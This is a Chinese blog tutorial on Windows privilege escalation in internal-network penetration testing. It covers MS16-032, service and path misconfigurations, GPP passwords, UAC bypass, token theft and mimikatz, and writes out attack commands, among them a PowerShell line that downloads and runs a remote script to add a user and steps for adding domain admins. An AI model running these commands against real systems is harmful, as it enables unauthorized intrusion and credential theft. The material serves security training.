进行提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、系统配置错误提权"><span class="toc-text">二、系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、系统服务权限配置错误"><span class="toc-text">1、系统服务权限配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、注册表键AlwayslnstallElevated"><span class="toc-text">2、注册表键AlwayslnstallElevated</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、可信任服务路径漏洞"><span class="toc-text">3、可信任服务路径漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、自动安装配置文件"><span class="toc-text">4、自动安装配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、利用计划任务提权"><span class="toc-text">5、利用计划任务提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、Empire-内置模块提权"><span class="toc-text">6、Empire 内置模块提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三、组策略首选项提权"><span class="toc-text">三、组策略首选项提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四、绕过UAC-提权"><span class="toc-text">四、绕过UAC 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、使用MSF-绕过UAC-提权"><span class="toc-text">1、使用MSF 绕过UAC 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、使用Nishang-绕过UAC-提权"><span class="toc-text">2、使用Nishang 绕过UAC 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、使用Empire-中的baypassuac-模块"><span class="toc-text">3、使用Empire 中的baypassuac 模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#五、令牌窃取提权"><span class="toc-text">五、令牌窃取提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、使用MSF-窃取令牌"><span class="toc-text">1、使用MSF 窃取令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、Rotten-Potato-本地提权"><span class="toc-text">2、Rotten Potato 本地提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、添加域管理员"><span class="toc-text">3、添加域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、Empire-下的令牌窃取"><span class="toc-text">4、Empire 下的令牌窃取</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="内网渗透-权限提升"><a href="#内网渗透-权限提升" class="headerlink" title="内网渗透-权限提升"></a>内网渗透-权限提升</h1><blockquote>
+<p>windows的四种权限：</p>
+</blockquote>
+<pre><code>User:普通用户权限，是系统中最安全的权限。
+Administrators:管理员权限。可以利用Windows机制将自己提升为system权限，以便操作sam 文件等。
+System:系统权限。可以对sam 等敏感文件进行读取，往往需要将administrator 权限提升为system权限才可以对sam 文件进行操作。
+TrustedInstaller:windows 中最高权限。对系统文件，即使拥有system权限也无法进行修改。只有该权限的用户才可以进行修改。</code></pre><h1 id="一、系统内核溢出漏洞提权"><a href="#一、系统内核溢出漏洞提权" class="headerlink" title="一、系统内核溢出漏洞提权"></a>一、系统内核溢出漏洞提权</h1><h2 id="1、查看缺失补丁"><a href="#1、查看缺失补丁" class="headerlink" title="1、查看缺失补丁"></a>1、查看缺失补丁</h2><h3 id="使用手工查看补丁情况"><a href="#使用手工查看补丁情况" class="headerlink" title="使用手工查看补丁情况"></a>使用手工查看补丁情况</h3><pre><code>1、systeminfo
+2、Wmic qfe get Caption,Description,HotFixID,InstalledOn
+3、Wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB3143141&quot; /C:&quot;KB976902&quot; 查看指定补丁</code></pre><h3 id="使用-Window-Exploit-Suggester-工具"><a href="#使用-Window-Exploit-Suggester-工具" class="headerlink" title="使用 Window Exploit Suggester 工具"></a>使用 Window Exploit Suggester 工具</h3><pre><code>1、使用systeminfo 命令获取补丁情况并将其保存为txt文件。
+2、更新漏洞库：./windows-exploit-suggester.py --update
+3、安装xlrd 模块：pip install xlrd
+4、对比补丁：python2 windows-exploit-suggester.py -d 2020-02-05-mssb.xls -i systeminfo.txt</code></pre><h3 id="使用-MSF-查看缺失补丁"><a href="#使用-MSF-查看缺失补丁" class="headerlink" title="使用 MSF 查看缺失补丁"></a>使用 MSF 查看缺失补丁</h3><pre><code>1、使用MSF 的post/windows/gather/enum_patches 模块，根据漏洞编号快速找出系统缺少的补丁。
+2、使用MSF 的post/multi/recon/local_exploit_suggester模块，找出系统中可能被利用的漏洞。</code></pre><h3 id="使用-PowerShell中的Sherlock-脚本"><a href="#使用-PowerShell中的Sherlock-脚本" class="headerlink" title="使用 PowerShell中的Sherlock 脚本"></a>使用 PowerShell中的Sherlock 脚本</h3><pre><code>PS C:\&gt; Import-Module .\Sherlock.ps1
+PS C:\&gt; Find-AllVulns  //搜索所有未安装的补丁</code></pre><h2 id="2、利用缺失补丁"><a href="#2、利用缺失补丁" class="headerlink" title="2、利用缺失补丁"></a>2、利用缺失补丁</h2><h3 id="1、powershell提权"><a href="#1、powershell提权" class="headerlink" title="1、powershell提权"></a>1、powershell提权</h3><pre><code>1、查看指定补丁：
+Wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB3143141&quot; /C:&quot;KB976902&quot;
+2、使用 KB3143141 对应的 MS16-032 漏洞进行提取
+本地执行：
+命令1：..\Invoke-MS16-032.ps1
+命令2：Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user testuser test123 /add&quot;
+远程执行：
+powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.100.52/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user testuser test123 /add&apos;&quot;</code></pre><h3 id="2、使用-MSF-进行提权"><a href="#2、使用-MSF-进行提权" class="headerlink" title="2、使用 MSF 进行提权"></a>2、使用 MSF 进行提权</h3><pre><code>1、use post/multi/recon/local_exploit_suggester 使用该模块查看可利用的漏洞
+2、使用可利用的漏洞模块进行提权</code></pre><h3 id="3、使用对应漏洞的exp-进行提权"><a href="#3、使用对应漏洞的exp-进行提权" class="headerlink" title="3、使用对应漏洞的exp 进行提权"></a>3、使用对应漏洞的exp 进行提权</h3><pre><code>1、https://github.com/lyshark/Windows-exploits</code></pre><h3 id="4、使用-CS-进行提权"><a href="#4、使用-CS-进行提权" class="headerlink" title="4、使用 CS 进行提权"></a>4、使用 CS 进行提权</h3><pre><code>1、直接使用Cobalt Strike 的 elevate 功能进行提权</code></pre><h1 id="二、系统配置错误提权"><a href="#二、系统配置错误提权" class="headerlink" title="二、系统配置错误提权"></a>二、系统配置错误提权</h1><blockquote>
+<p>当无法通过系统内核溢出漏洞提权，此时可以尝试通过系统配置错误来提权。windows操作系统中常见的配置错误包括管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高等。</p>
+</blockquote>
+<h2 id="1、系统服务权限配置错误"><a href="#1、系统服务权限配置错误" class="headerlink" title="1、系统服务权限配置错误"></a>1、系统服务权限配置错误</h2><pre><code>1、使用 MSF 的exploit/windows/local/service_permissions 模块
+2、使用 powershell的PowerUp 脚本，Invoke-AllChechs 模块进行检查，列出存在问题的所有服务。命令如下：
+命令1：powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\PowerUp.ps1;Invoke-AllChechs}&quot; 
+命令2：powershell.exe -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;C:\PowerUp.ps1&apos;); Invoke-AllChecks&quot;
+命令3：powershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://ip/PowerUp.ps1&apos;); Invoke-AllChecks&quot;
+命令4：powershell -exec bypass -C IEX (New-Object Net.WebClient).DownloadString(&apos;C：\PowerUp.ps1&apos;); Invoke-ServiceBinary -ServiceName &apos;OmniServers&apos; -Username testuser -Password test@123  #利用Install-ServiceBinary模块，通过write-servicebinary 编写一个C# 服务来添加用户。</code></pre><h2 id="2、注册表键AlwayslnstallElevated"><a href="#2、注册表键AlwayslnstallElevated" class="headerlink" title="2、注册表键AlwayslnstallElevated"></a>2、注册表键AlwayslnstallElevated</h2><blockquote>
+<p>注册表键AlwayslnstallElevated 是一个策略设置项，Windows允许低权限用户以system权限运行安装文件。如果启用此策略设置项，任何权限的用户都能以NT AUTHORITY\SYSTEM 权限来安装恶意的MSI文件。</p>
+</blockquote>
+<pre><code>该漏洞产生的原因是用户开启了windows Install 特权安装功能
+配置如下：（运行-gpedit.msc）
+1、组策略-计算机配置-管理模板-windows组件-window install- 永远以高特权进行安装：选择启用
+2、组策略-用户配置-管理模板-windows组件-window install- 永远以高特权进行安装：选择启用
+设置后，注册表以下两个位置自动创建键值“1”：
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+利用PowerUp 进行提权
+1、powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&apos;C:\PowerUp.ps1&apos;); Get-RegistryAlwaysInstallElevated #使用Get-RegistryAlwaysInstallElevated模块检查注册表是否被设置，如果true，则已经设置。
+2、运行write-UserAddMSI 模块，生成MSI文件，然后以普通用户权限运行UserAdd.msi 就会添加一个管理员账户。
+命令：msiexec /q /i UserAdd.msi   #/i：安装程序 #/quite:安装过程禁止向用户发送信息。 /qn：不使用GUI
+
+利用MSF 的exploit/windows/local/always_install_elevated 模块进行提权</code></pre><h2 id="3、可信任服务路径漏洞"><a href="#3、可信任服务路径漏洞" class="headerlink" title="3、可信任服务路径漏洞"></a>3、可信任服务路径漏洞</h2><blockquote>
+<p>漏洞产生原因：因为Windows 服务通常都是以system权限运行的，所以系统再解析服务所对应的文件路径中的空格时，就会以系统权限进行。例如：有一个文件路径“C:\Program Files\Some Folder\Service.exe”，对于该路径中的每一个空格，window都会尝试寻找并执行与空格前面的名字相匹配的程序。操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。</p>
+<p>  该漏洞存在如下两种可能性：</p>
+</blockquote>
+<ul>
+<li>如果路径与服务有关，就任意创建一个服务或者编译service模板。   </li>
+<li>如果路径与可执行文件有关，就任意创建一个可执行文件。<blockquote>
+<p> 如例子中,windows会依次尝试确定和执行下列程序：</p>
+</blockquote>
+</li>
+<li>C:\Program.exe </li>
+<li>C:\Program Files\Some.exe</li>
+<li>C:\Program Files\Some Folder\Service.exe<br>因此，如果一个被“适当”命令的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以system权限运行（在大多数情况下）。</li>
+</ul>
+<pre><code>a、手工查询进行利用：
+
+1、使用wmi命令，检查目标机器是否存在该漏洞
+wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;   
+2、如果有， 使用icacls工具进行查看。检查是否对目标文件夹的写权限。
+ icacls &quot;C:\Program Files\Some Folder\&quot;
+
+3、确定目标机器存在漏洞后，把要上传的程序重命名并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务
+sc stop service_name
+sc start service_name
+
+
+b、使用MSF 中的windows service trusted path privilege escalation 模块进行提权。</code></pre><h2 id="4、自动安装配置文件"><a href="#4、自动安装配置文件" class="headerlink" title="4、自动安装配置文件"></a>4、自动安装配置文件</h2><blockquote>
+<p>当网管在内网中给多台机器配置同一个环境时，往往使用脚本化批量部署的方法。在这一过程中，会使用安装配置文件。这些文件中包含了所有的安装配置信息，其中的一些还可能包含本地管理员账户和密码等信息。</p>
+</blockquote>
+<pre><code>常见文件如下：
+C:\sysprep.inf
+C:\sysprep\sysprep.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep.xmf
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\system32\sysprep\unattend.xml
+C:\Windows\system32\sysprep\panther\unattend.xml
+
+使用下面的命令，搜索Unattend.xml文件
+dir /b /s c:Unattend.xml
+
+使用MSF 中post/windows/gather/enum_unattend 模块进行搜索</code></pre><h2 id="5、利用计划任务提权"><a href="#5、利用计划任务提权" class="headerlink" title="5、利用计划任务提权"></a>5、利用计划任务提权</h2><blockquote>
+<p>通过查看计划任务和目录权限的配置情况，如果攻击者发现对以高权限运行的任务所在目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样，在计划任务下次执行时，就会以高权限来运行恶意程序。</p>
+</blockquote>
+<pre><code>1、查看系统运行的计划任务
+ Schtasks /query /fo LIST /v
+ Get-ScheduledTask
+ Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike&quot;*$env:UserName*&quot;)} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name=&quot;User&quot;;Expression={$_.Principal.userID}}
+
+2、查看文件加权限
+   使用 accesschk.exe 查看文件
+   列出某个驱动器下所有权限配置有缺陷的文件夹：
+   accesschk.exe -uwdqsUsers c:\
+   accesschk.exe -uwdqs &quot;AuthenticatedUsers&quot; c:\
+   列出某个驱动器所有权限配置有缺陷的文件：
+   accesschk.exe -uwqsUsers c:\*.*
+   accesschk.exe -uwqs&quot;AuthenticatedUsers&quot;c:\*.*
+
+3、替换目标文件
+   如果存在写权限，可以替换为恶意程序</code></pre><h2 id="6、Empire-内置模块提权"><a href="#6、Empire-内置模块提权" class="headerlink" title="6、Empire 内置模块提权"></a>6、Empire 内置模块提权</h2><blockquote>
+<p>Empire 内置了PowerUp 的部分模块。输入“usemodule privesc/powerup”命令，然后按“tab”键，查看powerup 的模块列表，使用里面allchecks 模块查找系统中的漏洞。</p>
+</blockquote>
+<pre><code>usemodule privesc/powerup/allchecks
+execute
+
+1、AllChecks 模块的应用对象如下：
+2、没有被引号起来的服务的路径。
+3、ACL 配置错误的服务（攻击者通常通过“service_* ” 利用它）。
+4、服务的可执行文件的权限设置不当（攻击者通常使用“service_exe_*”利用它）。
+5、Unattend.xml文件。
+6、注册表AlwaysInstallElevated.
+7、如果有Autologon 凭证，都会留在注册表中。
+8、加密的web.config 字符串和应用程序池的密码
+9、%PATH%.DLL的劫持机会（攻击者通常使用write_dllhijacker 利用它）。</code></pre><h1 id="三、组策略首选项提权"><a href="#三、组策略首选项提权" class="headerlink" title="三、组策略首选项提权"></a>三、组策略首选项提权</h1><blockquote>
+<p>win2008 server 引入了一项称为组策略首选项的新功能，该功能使管理员可以部署影响域中计算机/用户的特定配置。通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员账户的用户名或密码对注册表进行更改。</p>
+</blockquote>
+<pre><code>SYSVOL
+1、sysvol是活动目录的一个用于存储公共文件服务器副本的共享文件夹，在
+域中的所有域控之间进行复制。
+2、sysvol文件夹是在安装活动目录时候自动创建的，主要用来存放登录脚本、
+组策略数据及其他域控需要的域信息。
+3、sysvol在所有经过身份验证的域用户或者域信任用户具有读权限的活动目
+录的域范围内共享。
+4、整个sysvol目录在所有的域控中是自动同步和共享的，所有组策略在
+C:\\Windows\\SYSVOL\\domain\\Policies中
+
+
+
+前提:
+1、管理员通过组策略统一修改过密码
+2、在域控上执行:开始-&gt;运行-&gt;输入gpmc.msc-&gt;选择test.com-&gt;右键组策略对象-&gt;新建,我这里新建一个test组策略
+会弹出一个组策略管理编辑器,然后计算机配置-&gt;首选项-&gt;控制面板设置本地用户和组
+右键本地用户和组-&gt;新建-&gt;本地用户
+3、手工查看
+在C:\\Windows\\SYSVOL\\domain\\Policies 下找到groups.xml文件，获取里面的账户密码。然后使用gpp-decrypt对哈希值进行破解，获取明文。
+4、工具查看: 
+Get-GPPPassword.ps1、MetasploitE、mpire
+
+命令:
+1、 
+PowershellImport-Module .\Get-GPPPassword.ps1
+Get-GPPPassword.ps1
+2、MSF
+use post/windows/gather/credentials/gpp
+3、 Empire
+usemodule privesc/gpp</code></pre><h1 id="四、绕过UAC-提权"><a href="#四、绕过UAC-提权" class="headerlink" title="四、绕过UAC 提权"></a>四、绕过UAC 提权</h1><h3 id="1、使用MSF-绕过UAC-提权"><a href="#1、使用MSF-绕过UAC-提权" class="headerlink" title="1、使用MSF 绕过UAC 提权"></a>1、使用MSF 绕过UAC 提权</h3><pre><code>条件：
+1、系统当前用户必须在管理员组中。
+2、用户账户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机通知我”
+
+MSF UAC 绕过模块
+1、use exploit/windows/local/baypassuac #该模块运行时会因为在目标上创建多个文件而被杀毒软件识别，因此该模块提权成功率很低。
+2、use exploit/windows/local/baypassuac_injection #该模块直接运行在内存的反射DLL中，所以不会接触目标机的硬盘，从而降低了被杀毒软件的查杀。
+3、use exploit/windows/local/ask #创建一个可执行文件，目标机器会运行一个发起提权请求的程序，提示用户是否继续运行，如果继续则会获取一个高权限，即提权成功。（想要runas模块提权，当前用户必须在管理员组中或者知道管理员的密码，对UAC的设置则没有要求）</code></pre><h3 id="2、使用Nishang-绕过UAC-提权"><a href="#2、使用Nishang-绕过UAC-提权" class="headerlink" title="2、使用Nishang 绕过UAC 提权"></a>2、使用Nishang 绕过UAC 提权</h3><blockquote>
+<p>使用Nishang 中Invoke-PsUACme 模块进行绕过，Invoke-PsUACme 模块使用来自UACME项目的DLL绕过UAC。</p>
+</blockquote>
+<pre><code>PS &gt; Invoke-PsUACme -Verbose  #使用sysprep方法并执行默认的payload
+PS &gt; Invoke-PsUACme -method oobe -Verbose #使用oobe方法并执行默认的payload
+PS &gt; Invoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot; #使用-payload参数，可以自行指定要执行的payload</code></pre><h3 id="3、使用Empire-中的baypassuac-模块"><a href="#3、使用Empire-中的baypassuac-模块" class="headerlink" title="3、使用Empire 中的baypassuac 模块"></a>3、使用Empire 中的baypassuac 模块</h3><pre><code>1、usemodule privesc/bypassuac
+2、usemodule privesc/bypassuac_wscipt </code></pre><h1 id="五、令牌窃取提权"><a href="#五、令牌窃取提权" class="headerlink" title="五、令牌窃取提权"></a>五、令牌窃取提权</h1><blockquote>
+<p>令牌（token）是系统的临时密钥，相当于账户和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测性，攻击者或软件无法猜测出令牌。</p>
+</blockquote>
+<p>令牌分类：</p>
+<blockquote>
+</blockquote>
+<ul>
+<li>访问令牌（Access Token）：表示访问控制操作主体的系统对象。</li>
+<li>会话令牌（Session Token）：是交互会话中唯一的身份标识符。</li>
+<li>密保令牌（Security Token）：又叫做认证令牌或者硬件令牌，是一种计算机身份校验的物理设备，例如U盾。</li>
+</ul>
+<h3 id="1、使用MSF-窃取令牌"><a href="#1、使用MSF-窃取令牌" class="headerlink" title="1、使用MSF 窃取令牌"></a>1、使用MSF 窃取令牌</h3><pre><code>1、meterpreter &gt; use incognito  #使用incognito模块
+2、meterpreter &gt; list_tokens -u #列出有效的令牌
+   Delegation Tokens Available （授权令牌，支持交互式登录。例如用户直接登录、远程桌面登录）
+   Impersonation Tokens Available（模拟令牌，支持非交互式会话。例如使用net use 访问共享文件夹）
+3、meterpreter &gt; impersonate_token &quot;WIN-123-JLDJF\\Administrator&quot;（输入主机名\用户名时，需要输入两个\\）</code></pre><h3 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h3><pre><code>如果是webshell 的时候，需要使用执行rottenpotato获取其他令牌
+1、meterpreter &gt; use incognito  #使用incognito模块
+2、meterpreter &gt; list_tokens -u #列出有效的令牌
+3、meterpreter &gt; upload /root/rottenpotato.exe ./ #上传rottenpotato.exe 到目标机上
+4、meterpreter &gt; execute -HC -f rottenpotato.exe #执行rottenpotato.exe
+5、meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;（输入主机名\用户名时，需要输入两个\\）</code></pre><h3 id="3、添加域管理员"><a href="#3、添加域管理员" class="headerlink" title="3、添加域管理员"></a>3、添加域管理员</h3><pre><code>方法一：
+如果存在域管理进程，找到域管理进程之后，使用migrate 命令迁移到该进程。然后输入“shell” 进入命令行界面，添加域管理员
+ net user test test@123 /ad /domain #添加域用户
+ net group &quot;domain admins&quot; test /ad /domain #添加到域管理员组
+ net group &quot;domain admins&quot; /domian  #查看是否添加到域管理员组
+
+ 方法二：
+ 使用MSF中的incognito 模块来模拟域管理员，然后通过迭代系统中所有可用的身份验证令牌来添加域管理员
+
+ add_user test test@123 -h 172.16.12.100 #在域控主机上添加一个账户
+ add_group_user &quot;Domain Admins&quot; test -h 172.16.12.100 # 将该账户加到域管理员组中</code></pre><h3 id="4、Empire-下的令牌窃取"><a href="#4、Empire-下的令牌窃取" class="headerlink" title="4、Empire 下的令牌窃取"></a>4、Empire 下的令牌窃取</h3><blockquote>
+<p>在Empire下获取服务器的权限后，可以使用内置的mimikatz 工具获取系统密码。</p>
+</blockquote>
+<pre><code>1、获取empire shell 后，运行mimikatz
+2、creds #查看密码
+3、pth n #获取身份令牌(n表示creds 列出来的账户密码表的序号)
+4、revtoself #恢复令牌权限</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Beret-81
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
